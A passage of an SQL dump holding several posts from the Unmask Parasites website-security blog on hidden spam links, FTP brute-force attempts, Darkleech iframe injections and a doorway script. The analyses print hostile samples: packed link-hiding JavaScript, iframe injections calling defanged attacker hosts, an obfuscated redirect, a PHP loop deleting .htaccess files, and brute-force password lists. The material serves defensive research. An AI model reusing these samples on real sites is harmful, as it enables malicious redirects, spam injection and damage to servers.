of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (77, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (78, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (79, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (80, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (81, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (82, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (83, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names 